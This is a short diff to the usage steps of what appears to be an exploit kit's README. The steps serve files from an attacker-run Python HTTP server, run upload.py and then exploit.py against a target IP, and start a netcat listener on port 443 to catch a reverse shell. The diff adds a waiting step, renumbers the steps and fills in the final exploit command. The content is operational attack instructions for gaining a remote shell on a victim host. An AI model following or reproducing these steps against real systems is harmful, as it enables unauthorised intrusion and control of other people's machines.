@@ -7,15 +7,16 @@
    ```
    python3 -m http.server 80
    ```
-3. Edit upload.py at line 119 and run
+3. Edit upload.py at line 119 then run the command 
    ```
    python2 upload.py target_ip
    ```
-4. Run a nc for getting reverse shell
+4. wait a little bit for getting response in python server 
+5. Run a nc for getting reverse shell
    ```
    nc -lnvp 443
    ```
-5. Edit exploit.py at line 119 and run
+6. Edit exploit.py at line 119 and run
    ```
-
+   python2 exploit.py
    ```
